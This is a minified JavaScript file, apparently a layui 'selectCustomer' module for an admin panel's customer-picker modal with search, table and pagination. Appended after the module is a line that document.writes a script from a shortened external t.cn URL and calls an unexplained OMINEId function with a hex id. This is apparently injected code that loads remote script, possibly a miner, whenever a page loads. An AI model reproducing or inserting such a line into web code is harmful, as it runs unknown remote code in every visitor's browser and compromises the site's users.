"use strict";layui.define(["layer","table","form","laypage"],function(e){var c,o=layui.layer,t=layui.table,a=layui.form,l=layui.laypage,s=function(e,t){$.get("/Admin/Customer/customerList",e,function(e){0===(e=$.parseJSON(e)).error?(c=e.data,t(e.data)):o.tips(e.msg,".modal-search-btn")})},r=function(e){console.log("datalist",e.list),t.render({elem:".select-modal-table",data:e.list,page:!1,limit:e.pageSize,cellMinWidth:160,height:"320",cols:[[{field:"checkbox",width:50,fixed:"left",templet:'<div><input class="select-modal-checkbox" lay-filter="c_check" type="checkbox" name="" lay-skin="primary"></div>'},{field:"id",title:"id",width:160},{field:"user_name",title:"客户账号",width:160},{field:"nick_name",title:"客户名称",width:160,templet:function(e){return e.company?e.company.company_name:""}},{field:"nick_name",title:"公司名称",width:160},{field:"user_mobile",title:"联系电话",width:160},{field:"user_type",title:"客户类型",width:160}]]}),a.on("checkbox(c_check)",function(e){$(".select-modal-checkbox").prop("checked",!1),$(e.elem).prop("checked",!0),a.render("checkbox")})},i=function(i){l.render({elem:$(".layui-layer-content").find(".select-modal-page")[0],limit:i.pageSize,count:i.count,curr:i.page,layout:["prev","page","next"],jump:function(e,t){var a=$(".modal-search-input").val().trim();t||s({page:e.curr,pageSize:i.pageSize,name:a||""},function(e){r(e)})}})};e("selectCustomer",{start:function(n){o.open({title:"选择客户",type:0,area:["640px","540px"],content:'<div class="select-modal-container"> <div class="select-modal-box"> <div class="select-search-container"><input class="layui-input modal-search-input" type="text" placeholder="输入客户信息检索"><div class="layui-btn-group" style="margin-top:-4px"> <button class="layui-btn modal-search-btn">搜索</button> <button class="layui-btn layui-btn-primary modal-clear-btn">清空</button> </div></div><table lay-filter="select-modal-table" class="select-modal-table"></table> <div class="select-modal-page"></div> </div> </div>',success:function(){$(".modal-search-btn").click(function(){var e={},t=$(".modal-search-input").val().trim();t&&(e.name=t),s(e,function(e){r(e),i(e)})}),$(".modal-clear-btn").on("click",function(){$(".modal-search-input").val(""),s({},function(e){r(e),i(e)})}),s({},function(e){r(e),i(e)})},yes:function(e,t){var a=$(".layui-layer-content .select-modal-checkbox:checked");if(a.length){var i=a.parent().parent().parent().index(),l=c.list[i];n(l),o.close(e)}else o.tips("请勾选需要操作的数据",".layui-layer-btn0")}})},initInput:function(e,a,i){var l=this;e=e||".jl-select-customer",i=i||"user_name",$(e).click(function(){var t=$(this);l.start(function(e){t.val(e[i]),t.data("id",e.id),t.siblings("input")&&t.siblings("input").val(e.id),a&&a(e)})})}})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
